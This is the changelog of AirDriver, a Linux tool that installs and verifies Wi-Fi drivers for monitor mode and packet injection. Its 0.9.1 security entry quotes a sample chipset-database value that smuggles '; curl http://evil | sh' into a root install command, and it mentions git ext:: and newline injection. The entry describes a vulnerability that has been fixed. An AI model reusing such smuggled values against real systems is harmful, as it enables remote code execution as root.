# Changelog

All notable changes to AirDriver are documented here.

## [0.9.1] — 2026-09-17 · security hardening

A security review of the whole codebase, on the premise that matters here:
**AirDriver runs as root and executes shell commands**, so the question is
whether anything it did not author can end up running.

### Fixed — the chipset database could execute as root (the real one)

`chipsets.json` is contributed to by pull request, and its `package`, `module`,
`repo`, `path` and `blacklist` values were interpolated **unquoted** into root
commands. A plausible-looking entry such as

```json
{ "method": "apt", "package": "realtek-dkms; curl http://evil | sh" }
```

produced `sudo apt-get install -y realtek-dkms; curl http://evil | sh`, and
`airdriver db --check` — the CI gate — accepted it. The same held for a
`blacklist` entry (which also reached `/etc/modprobe.d`, where a newline could
smuggle in extra directives), for a `repo` using git's command-executing
`ext::` transport, and for an `offline` `path` escaping `data/` via `..`.

Fixed in two layers:

1. **Rejected at the gate** — `ChipsetDB.problems()` now validates each of those
   fields against a strict whitelist of shapes, so CI fails a hostile pull
   request at review time. `repo` is pinned to `https://`; `path` must stay
   under `data/`.
2. **Quoted at the point of use** — every such value is `shlex.quote`d, so even a
   hand-edited database cannot break out. `offline_source_dir()` now resolves and
   confirms containment, and `blacklist_snippet()` refuses unsafe module names.

### Fixed — command-line arguments reaching root shells

`modeswitch` now requires a literal `vid:pid`; `rebuild` quotes its target.
Defence in depth (you are already root), but it makes AirDriver safe to script.

### Fixed — `doctor` painted Secure Boot green

The row-status flag was computed and then never used, so the colour only ever
reddened a literal `MISSING`. **Secure Boot: on printed green** — precisely the
condition that makes a freshly built module refuse to load. It is now coloured as
the problem it is, while `Internet: no` and `Root: no` stay neutral, as intended.

### Added

* `SECURITY.md` — threat model, what is trusted, what deliberately isn't
  (out-of-tree driver sources are compiled as root; that is what installing a
  driver means), and how to report a vulnerability.
* `tests/test_security.py` — 14 regression tests covering both layers, plus a
  test that the *shipped* database still passes, so the rules can't drift into
  being too strict.

### Housekeeping

`pyflakes` is clean across the package, tests and scripts (dead imports removed).

## [0.9.0] — 2026-09-16 · "One Command"

Every capability AirDriver has was already here — `scan`, `install`, `verify`,
`monitor start`, `monitor test`. Knowing *that sequence* was the last piece of
expertise the tool still quietly demanded of you. Now there is one command.

### Added — `airdriver setup`

One run takes an adapter from *plugged in* to *injection confirmed*:

1. picks the most pentest-capable adapter present (a USB injector always beats an
   internal card — internal Wi-Fi essentially never injects),
2. reports what the hardware can actually do, straight from the database,
3. installs the driver — or skips when the adapter already works,
4. verifies the module really **bound to the device**,
5. enables monitor mode, reading the mode **back from sysfs** rather than trusting
   `airmon-ng`'s exit code (it also finds the `wlan0` → `wlan0mon` rename),
6. runs the `aireplay-ng` injection self-test,

and ends with one honest verdict plus the exact next step.

The honesty rules are the point:

* A chipset the database says **cannot inject** is never held to an injection bar
  it can't clear — it reports "this is the hardware, not the install", instead of
  blaming a perfectly good driver.
* A failed injection test says **"not confirmed here"**, because that test
  legitimately fails with no AP in range.
* A step that couldn't run (no root, no `aircrack-ng`) says so, and the verdict
  stays short of "ready" rather than quietly claiming success.

Flags: `--dry-run`, `--no-monitor`, `--no-inject`, and an optional target.

### Added — GUI

**"Get me ready"** is now the single primary button, running the same flow on a
worker thread with the output streamed live. `Install driver` remains for driving
the steps yourself.

### Tests

17 new tests (**125 total**) covering adapter ranking, target resolution, every
verdict branch, and the monitor-interface read-back.

## [0.8.0] — 2026-08-27 · "Wider Net"

**52 chipset families / 1258 USB+PCI IDs**, up from 40 / 858 — twelve new families, and
capability flags that are now sourced from the kernel rather than from reputation.

### Added — 12 families (+400 IDs), every id from a kernel device table

| Family | IDs | Monitor | Injection |
|---|--:|:--:|:--:|
| Intel Centrino / Wireless-N (1000–6000) | 38 | yes | no |
| Qualcomm QCA6390 / WCN6855 (`ath11k`) | 2 | **no** | no |
| Qualcomm QCN9074 (`ath11k`) | 1 | yes | unknown |
| Qualcomm WCN7850 — Wi-Fi 7 (`ath12k`) | 1 | yes | unknown |
| Qualcomm QCN9274 / QCC2072 (`ath12k`) | 2 | yes | unknown |
| Atheros AR5xxx legacy PCI (`ath5k`) | 21 | yes | **good** |
| ZyDAS ZD1211 / ZD1211B | 58 | yes | fair |
| Atheros AR5523 USB | 55 | yes | unknown |
| Ralink RT2501USB / RT73 | 74 | yes | **good** |
| Ralink RT2500USB (RT2570) | 29 | yes | fair |
| Intersil/Conexant Prism54 USB | 63 | yes | fair |
| Broadcom FullMAC (`brcmfmac`) | 31 | **no** | no |

Existing Intel and Atheros families were widened from the same tables: `iwlwifi_legacy`
+5, `intel_ax2xx` +10, `intel_be200` +9, `ath10k_pci` +1.

### Changed — capability flags are now evidence, not folklore

The monitor/injection flags are the promise this project makes, so they are read out of
the kernel source rather than asserted:

- **mac80211 always adds monitor.** `net/mac80211/main.c` does
  `hw->wiphy->interface_modes |= BIT(NL80211_IFTYPE_MONITOR)` under the comment
  *"mac80211 always supports monitor"*. Every softmac family here inherits that, which is
  why the legacy USB parts are flagged monitor-capable even where their own driver
  advertises only station mode.
- **`ath11k` takes it away again, per chipset.** `hw_params.supports_monitor` is `false`
  for **QCA6390** and **WCN6855**, and ath11k then clears `NL80211_IFTYPE_MONITOR` right
  after `ieee80211_register_hw()`. These are extremely common in 2021+ laptops, so the
  entry says plainly that monitor mode is never offered — no airmon-ng invocation changes
  it. The flag is not pessimism; it is the driver's own table.
- **`ath12k` sets it true for WCN7850**, so the Wi-Fi 7 generation *can* sniff where its
  QCA6390 predecessor cannot. The two are deliberately separate families so one flag
  can't launder the other.
- **`brcmfmac` is FullMAC** — it never goes through mac80211 and only advertises monitor
  when firmware reports the feature, which consumer firmware does not. Raspberry Pi and
  MacBook Wi-Fi are flagged accordingly.
- **Injection is claimed only where there is a track record.** ath11k/ath12k and AR5523
  are flagged `unknown` rather than `true`, and `recommend` therefore won't suggest them
  for attack work. Promising injection AirDriver can't stand behind is worse than
  admitting the gap.

### Changed — an ambiguous ID is omitted, not guessed

`050d:7050` and `0707:ee13` each appear in **more than one** kernel driver's device
table, so the chipset genuinely cannot be determined from the id. Rather than pick a
winner, both are left out: they surface as "unknown adapter" and route into
`airdriver contribute`. A wrong id installs the wrong driver, which is the one failure
mode this database exists to prevent.

### Fixed — four chipsets were told they could not sniff when they can

Auditing the flags against the kernel turned up the mistake in the *other*
direction: `rtl8821ce`, `rtl8822ce`, `rtl8723de` (rtw88) and `rtl8188fu`
(rtl8xxxu) were all flagged `monitor_mode: false`, while every one of their
siblings on the same driver was flagged true. Both drivers are mac80211 and
neither clears the monitor iftype the way ath11k does, so those cards *can* be
put into monitor mode. The RTL8821CE and RTL8822CE in particular are among the
most common internal laptop cards there are — telling their owners to go buy an
adapter they may not need is its own kind of dishonesty. Flags corrected, the
real caveat (no injection) moved into the notes, and a test now asserts that no
mac80211-driven chipset is marked blind.

### Tests

- **108 tests** (was 101). `EvidenceBackedCapabilities` pins the flags that came from
  kernel source — QCA6390/WCN6855 must stay non-sniffing, WCN7850 must stay sniffing,
  FullMAC Broadcom must never claim monitor — so a well-meaning "fix" can't quietly make
  the database optimistic. Also enforced: injection implies monitor, every quality value
  is on the declared scale, and the two ambiguous ids resolve to nothing.
- Database floors in the suite and the CI GUI job raised to the current 52 families.
- `test_mac80211_chipsets_are_not_marked_blind` walks every entry whose in-kernel
  driver sits on mac80211 and asserts it is not flagged monitor-incapable.

## [0.7.0] — 2026-08-27 · "Ground Truth"

Detection now reads the kernel's own view of your hardware instead of shelling out to
tools that may not be installed — and stops inventing adapters when they aren't.

### Fixed — AirDriver invented hardware on a minimal install

- **A missing `lsusb` made AirDriver fabricate three adapters.** Detection shelled out
  to `lsusb`, and when the binary wasn't found it fell back to *demo mode* — the
  synthetic RTL8812AU / AR9271 / unknown-device trio meant for previewing the GUI on a
  macOS dev box. `lsusb` lives in `usbutils`, which a minimal Kali or Parrot install
  does not necessarily ship. The result on such a box: three plausible adapters that
  don't exist, presented over real hardware that was sitting in sysfs the whole time,
  and a GUI status chip reading *"demo mode (non-Linux)"* on Linux. Worse, acting on it
  installs a driver for a chipset you don't own.

  Enumeration is now **sysfs-native** — `/sys/bus/usb/devices` and
  `/sys/bus/pci/devices` are read directly. sysfs is part of the kernel, so it is always
  there. Demo adapters are returned **only** when there is no sysfs at all, i.e. genuinely
  not Linux. On Linux an empty result now means *"the kernel sees no wireless hardware"*,
  which is a real answer, and both the CLI and the GUI say what to try next.
- **`usbutils` and `pciutils` are no longer required.** They are still used when present,
  purely to borrow their vendor-resolved product names (`lsusb` turns `0bda:8812` into
  "Realtek Semiconductor Corp. RTL8812AU"; sysfs only knows the device's own string
  descriptor, "802.11n NIC"). Detection is complete without them.

### Fixed — the wrong adapter was reported as working

- **Interfaces were paired with adapters by guesswork.** Any wireless interface that
  couldn't be matched by USB id was handed to the first PCI adapter in the list, via a
  literal `leftover.pop(0)`. With an internal card *and* a USB dongle plugged in — the
  normal pentest setup — the dongle's `wlan1` could be reported against the internal
  card. The adapter you were trying to fix showed **"Working — wlan1"** while the one
  that actually worked showed as dead, which sends you debugging the wrong device.

  Correlation is now by **sysfs device path**, which is exact: a netdev's `device`
  symlink is resolved and walked up to the owning device (one hop for USB, where the
  netdev hangs off the interface directory). USB-id matching remains as a fallback, and
  the last-resort pairing only fires when it is unambiguous — exactly one unmatched
  adapter and exactly one unmatched interface. Anything less certain is left unpaired
  rather than guessed at, because "no interface" is honest and a wrong one is not.

### Fixed — Ethernet and Bluetooth are no longer mistaken for Wi-Fi

- PCI devices are filtered on **class 0x0280** (wireless network controller), so an
  Ethernet NIC (subclass 0x00) is never offered a Wi-Fi driver. Previously any `lspci`
  line containing "network" qualified.
- An unknown USB device is surfaced when it declares **interface class 0xE0** (wireless
  controller) — but **subclass 0x01 within it is Bluetooth**, which is excluded. Every
  second laptop has one, and it is not a Wi-Fi adapter.
- USB root hubs (vendor `1d6b`, Linux Foundation) are skipped outright.
- Two PCI cards now keep distinct identities: the domain-qualified slot
  (`0000:03:00.0`) is recorded instead of an empty string.

### Improved

- **`airdriver contribute` works without usbutils.** The report for an unknown adapter
  is the only way a new chipset reaches the database, and without `lsusb -v` it used to
  arrive carrying no descriptors at all — precisely the fields a maintainer needs. The
  same descriptors are now read from sysfs as a fallback. The device **serial number is
  deliberately never collected**: the report is destined for a public issue, and a
  serial identifies one physical adapter and through it its owner.
- **`airdriver modeswitch`'s rescan step** lists devices from sysfs rather than piping
  `lsusb` through `grep`, so the step that tells you the dongle's *new* USB id still
  works on the minimal install where flip-storage dongles are most likely to turn up.
- **An empty scan is now actionable** — port/hub advice for high-power cards, the
  driver-CD-ROM case, and a note that unrecognised adapters still show up, so an empty
  list really does mean no wireless hardware.

### Tests

- New `tests/test_detector.py`: 20 tests over a **real fake sysfs tree** built on disk
  (real directories, real symlinks) and enumerated for real — nothing about sysfs parsing
  is mocked. Covers the demo-mode boundary in both directions, Bluetooth/Ethernet/root-hub
  exclusion, description precedence, and the two-device correlation case that used to
  mis-attribute.
- The modeswitch rescan loop is executed end-to-end against a fake bus, and the sysfs
  descriptor fallback is tested including the assertion that no serial number leaks.
- **101 tests** (was 75), all green on Python 3.9 / 3.11 / 3.13.

## [0.6.0] — 2026-08-02 · "Clean Sweep"

Teaches AirDriver about the Wi-Fi card that's already **inside** your laptop, makes
removing a driver actually remove it, and fixes button icons properly this time.

### Fixed — removal was quietly a no-op

- **`airdriver remove` removed nothing.** The DKMS search pattern was built from the
  *module* name and matched case-sensitively — but `dkms status` reports the *package*
  name. The driver for an RTL8812AU was looked up as `88XXau` while DKMS had it
  registered as `rtl88xxau`, nothing matched, and AirDriver reported a clean removal
  having done absolutely nothing. Matching is now case-insensitive and covers the module
  name, the chipset id, the apt package, and the common unprefixed form (`8812au`).
  `tests/test_removal.py` runs the real `grep` against real `dkms status` output.
- **Removal left the adapter with no driver at all.** Installing writes a modprobe
  blacklist so the in-kernel driver keeps its hands off the card. Removal never deleted
  it, so afterwards the out-of-tree driver was gone *and* the in-kernel one was still
  forbidden. Removal now deletes the blacklist and modprobes the in-kernel driver back.
- **`sudo` was stripped out of help text.** When running as root the executor did a blunt
  `str.replace("sudo ", "")` across the whole script, which also rewrote the word inside
  quoted messages — so advice that read "run: `sudo usb_modeswitch …`" lost its `sudo`
  and became wrong. Only `sudo` in command position is stripped now.
- **Installs reported unqualified success even when steps failed.** `Executor.run` built
  an `ok` flag it never updated. It now tracks optional-step failures and lists them.

### Fixed — button icons on Linux

- **Icons were rasterised once at 32px and rescaled by Qt to whatever the button asked
  for.** At the 16px icon size that meant a ~1.5px antialiased stroke got resampled down,
  which is why they looked faint or vanished depending on the desktop's scaling — and on
  fractional scaling (1.25x/1.5x, common under Wayland) it was worse. `icons.py` now
  paints through a **`QIconEngine`**, rendering on demand at exactly the size and
  device-pixel-ratio Qt requests. Verified rendering at 1x, 1.5x and 2x.
- **Two icons were geometrically broken.** The wrench was an unclosed arc that read as a
  random squiggle, and the refresh arrowhead was drawn detached from its arc. Both redrawn.
- **Default icon size 16px → 18px** with heavier strokes, so they hold up next to the label.
- **Every label inside a card drew its own dark rectangle.** The stylesheet's universal
  `QWidget { background: … }` rule painted the window colour behind child widgets too, so
  labels sitting on a lighter panel showed as mismatched boxes. Labels and checkboxes are
  transparent now.
- **The GUI now pins the Fusion style** unless you override it. Kali/Parrot commonly set
  `QT_QPA_PLATFORMTHEME=gtk3` (or ship qt6ct/Kvantum), and those themes restyle buttons
  with their own metrics and icon handling. Fusion is built into Qt, so it's also the one
  style guaranteed to exist on a minimal install. Override with `QT_STYLE_OVERRIDE`.
- The UI font is requested with a real fallback chain (`Inter → Cantarell → Noto Sans →
  DejaVu Sans`) instead of a single family that isn't installed on stock Kali.

### Added — the card inside your laptop

The database was almost entirely USB dongles, while "my Wi-Fi doesn't work on Kali" is
usually an *internal* card. **8 new families, +99 IDs — now 40 families / 858 IDs.**
Every id comes from the driver's own device table; capability flags are honest, including
the unflattering ones.

| Family | Covers | Monitor | Injection |
|---|---|:--:|:--:|
| `ath9k_pci` | Atheros AR5416–AR9565 PCIe | yes | **excellent** |
| `mt79xx_pci` | MediaTek MT7921E / MT7922 / MT7925E | yes | fair |
| `ath10k_pci` | QCA6174 / QCA9377 / QCA988x | yes | no |
| `iwlwifi_legacy` | Intel 7260 / 7265 / 3165 / 8260 / 8265 / 9260 / 9560 | yes | no |
| `intel_be200` | Intel WiFi 7 BE200 / BE201 | yes | no |
| `rtw89_pci` | RTL8852AE / 8852BE / 8852CE / 8922AE | yes | no |
| `rtlwifi_pci` | RTL8188CE / 8192CE / 8723AE / 8723BE / 8821AE | yes | no |
| `broadcom_sta` | Broadcom BCM43xx (`wl` / `b43`) | **no** | **no** |

If you have an `ath9k_pci` card you already own the best adapter in the room. If you have
Broadcom, AirDriver now says plainly that it cannot do monitor mode or injection and that
you need a USB adapter — rather than letting you spend an evening finding that out.

### Added — one command to clean up

- **`airdriver remove --all`** — removes every driver AirDriver installed, drops the
  blacklist, and hands your adapters back to their in-kernel drivers. DKMS entries are
  correlated against the chipset database first, so an unrelated module (VirtualBox,
  NVIDIA) is never caught in the sweep.
- **`uninstall.sh`** — a real uninstaller. Removes the launcher, venv, and blacklist;
  `--drivers` also clears the Wi-Fi drivers; `--all` additionally deletes the Secure Boot
  signing key. Defaults to *keeping* your drivers, because those are what make Wi-Fi work.
- **One-line install.** `install.sh` detects being piped from `curl`, clones itself to
  `/opt/airdriver`, and re-execs — so the README one-liner genuinely works.
- GUI: a **Remove all** button in the Drivers panel, listing exactly what will go before
  it goes. `Remove` gained a red icon and now explains that it un-blacklists too.
- `airdriver remove` gained `--dry-run`, and `--all` makes its `target` optional.
- `make test`, `make shots`, `make purge` targets.

### Changed
- `Executor.run()` now returns `False` when optional steps failed, so `airdriver remove` /
  `rebuild` / `sign` exit non-zero on a partial result instead of always claiming success.
- New icons: `eye`, `broom`, `chip`, `shield`, `plug`. `Preview plan` finally has one.

## [0.5.0] — 2026-07-27 · "Open Signal"

Fixes a UI regression that made buttons look broken on the machines AirDriver targets,
and makes contributing an unknown adapter a 30-second job.

### Fixed
- **Buttons appeared to have no icons on Kali/Parrot.** v0.3.0 and v0.4.0 put emoji
  (`🔧 📚 🩺 ⬇ 📋`) in button labels. A minimal Kali install has no emoji font, so those
  rendered as blank tofu boxes and the toolbar looked broken. All of them are replaced by
  **`airdriver/gui/icons.py`** — 16 icons drawn with QPainter, so they render identically
  on a bare box and a full desktop, at any DPI. Also swapped the risky `⟳`, `⚠` and `⬇`
  in log/help text for text that every default font set can show.
  `tests/test_gui_glyphs.py` now fails the build if an emoji reappears, or if a widget
  asks for an icon that doesn't exist.
- **Action-row labels were clipped** ("Install drive", "Export repor") once icons widened
  the buttons. The log actions moved onto the log header row, so the row can't overflow.

### Added — contributing back
- **`airdriver contribute`** — builds a complete, ready-to-file report for an unrecognised
  adapter (usb id, `lsusb` descriptors, kernel, distro, matching `dmesg` lines) and prints
  a pre-filled GitHub issue link. `--open` opens it. **Nothing is ever sent automatically:**
  the report describes the user's machine, so they read it and decide.
- GUI: a **Report this adapter** button next to *Identify as*, which shows the report,
  copies it to the clipboard, and offers to open the pre-filled issue.
- Structured **issue templates** (adapter / bug), a **PR template** whose checklist covers
  the ID-sourcing rules and the no-emoji rule, and **`CONTRIBUTING.md`** documenting how the
  database works and the three rules for adding IDs.

## [0.4.0] — 2026-07-26 · "Field Kit"

Turns AirDriver from an *installer* into a driver **manager**, and roughly triples the
hardware it recognises.

### Added — driver management
- **`airdriver status`** — the dashboard that was missing: every DKMS driver on the box,
  which kernels it's built for, whether it's built for the one you're *running*, whether
  it's loaded, and which chipset it serves. `--json` for scripts.
- **`airdriver rebuild`** — the fix for the single most common way Wi-Fi breaks on Kali:
  you `apt full-upgrade`, reboot into a new kernel, and the out-of-tree module was never
  built for it. Installs matching headers if needed, runs `dkms autoinstall`, re-checks.
- **`airdriver sign`** — Secure Boot support. Generates a MOK signing key once, signs every
  DKMS module built for the running kernel (correctly decompressing and **recompressing**
  `.ko.xz`/`.ko.zst`/`.ko.gz`), then prints the one step that needs a password you choose:
  `mokutil --import` + reboot. Enrollment is deliberately never automated.
- **`airdriver modeswitch`** — many cheap dongles enumerate as a fake CD-ROM full of Windows
  drivers and never appear as Wi-Fi. AirDriver now detects that state during a scan and can
  eject it with `usb_modeswitch`.
- **`airdriver recommend`** — ranks the chipsets that genuinely do monitor mode *and*
  injection, preferring ones needing no driver build. `--band 2.4|5`.
- GUI: a **🔧 Drivers** panel showing the same status with one-click Rebuild and Sign, and a
  scan-time warning when an adapter is stuck in storage mode.

### Changed
- Chipset database grown to **32 families / 759 unique USB+PCI IDs** (from 29 / 218). Every
  new id is extracted from the Linux kernel's own driver device tables — `rtl8xxxu` (split
  per chip via its `*_fops` markers), `rt2800usb`, `ath9k_htc` (AR9271 vs AR7010 via
  `driver_info`), `carl9170`, `mt76x0u`/`mt76x2u`/`mt7601u`/`mt7921u`/`mt7925u`,
  `rtw88`/`rtw89` and `rtl8187` — so nothing is guessed.
- New families: **RTL8723AU**, **RTL8192FU** (needs kernel 6.2+), and **RT2800-series
  (other)** — a catch-all covering 300+ rebadged in-kernel `rt2800usb` adapters that
  previously showed up as "unknown".
- `chipsets.json` is now written with wrapped id lists, so a 300-entry array stays readable.

### Fixed
- **Eight more mis-assigned USB IDs**, caught by cross-checking the kernel tables:
  `2357:0106` (RTL8814AU, was 8812au), `2357:0108`/`2357:0109` (RTL8192EU, were 8812au),
  `7392:b611` (RTL8821AU, was 8192eu), and `0b05:17d1`/`148f:760a`/`2357:0123`/`7392:b711`
  (MT7610U, were mt7612u/mt7601u). Each would have installed the wrong driver.
- `Executor` crashed with `AttributeError` on any plan without a chipset — which the new
  management plans are. It now labels those by method instead.

## [0.3.0] — 2026-07-25 · "Full Spectrum"

Broader, more accurate device coverage; installs that find a way to succeed; and a
first real test-suite + CI so it stays that way.

### Added
- **Automatic apt→source fallback.** When the chosen apt driver package is missing or
  hasn't caught up with your running kernel, the install step now transparently compiles
  the maintainer's driver from git in the same run — installing the build prerequisites
  on the fly — instead of failing. One "Install" still ends in a working driver.
- **New chipset family:** Realtek **RTL8710BU / RTL8188GU** (module `8188gu`, the
  `lwfinger/rtl8188gu` driver) — the newer budget 2.4 GHz nano dongles (e.g. Tenda W311MI).
- **In-GUI monitor-mode & injection panel** — enable/disable monitor mode and run the
  `aireplay-ng` injection self-test from the window (previously CLI-only).
- **Searchable chipset browser** in the GUI (**📚 Chipsets**), filtering all families and
  IDs by name, vendor, band, or `vid:pid`; plus a live DB-size pill in the status strip.
- **Scriptable output:** `airdriver scan --json` and `airdriver db --json`.
- **`airdriver db --check`** validates the database (unique IDs, valid driver methods,
  unique priorities) and exits non-zero on any problem.
- **`airdriver monitor status`** — show each wireless interface's current mode.
- **Test-suite** (`tests/`, pure-stdlib `unittest`) and **GitHub Actions CI** running the
  tests across Python 3.9–3.13 plus a headless PySide6 GUI import smoke-test.
- `scripts/gen_screenshots.py` to regenerate the docs screenshots headlessly.

### Changed
- Chipset database grown to **29 families / 218 unique USB/PCI IDs** (was 28 / ~160),
  expanded from the authoritative morrownr `supported-device-IDs` lists.
- The apt install path now also loads the driver module afterward (apt DKMS packages
  don't advertise a module name), so a successful apt install is a *loaded* driver.

### Fixed
- **Duplicate / mis-assigned USB IDs.** `0bda:a811` and `7392:a822` (and several Edimax /
  TP-Link `AU`/`CU`/`BU` IDs) were mapped to two chipsets at once, so lookups silently
  resolved to whichever loaded last and could mis-identify hardware. All IDs are now
  unique and matched to the correct chipset per the maintainer lists — enforced by tests.
- **AirDriver would not run at all on Python 3.9–3.11** (the versions Kali/Parrot ship),
  caught by the new CI matrix:
  - `cli.py` inlined a backslash-containing raw string inside an f-string expression —
    a `SyntaxError` before 3.12, so the CLI failed to even import.
  - `resources.files("airdriver.data")` raised `TypeError` on 3.9 because `data/` is a
    namespace directory; the chipset database now resolves from the filesystem first.
- **Dead/duplicate GUI code:** `run_diagnose`/`_on_diagnose_done` were each defined twice.
- **Socket leak** in the internet-connectivity check (used `create_connection` + `with`).

## [0.2.0] — 2026-06-19 · "Clean Install"

- Correct DKMS installs via the maintainer's own `install-driver.sh`, post-install
  verification (`verify`/`remove`/`fix`), rfkill/bring-up so a built driver actually works,
  the one-shot `diagnose` snapshot, and the Secure-Boot/headers doctor checks.

## [0.1.0] — 2026-06-13

- Initial release: adapter auto-detection, the chipset→driver database, the install
  engine (in-kernel / apt / DKMS-git / offline), the PySide6 GUI, and the CLI.
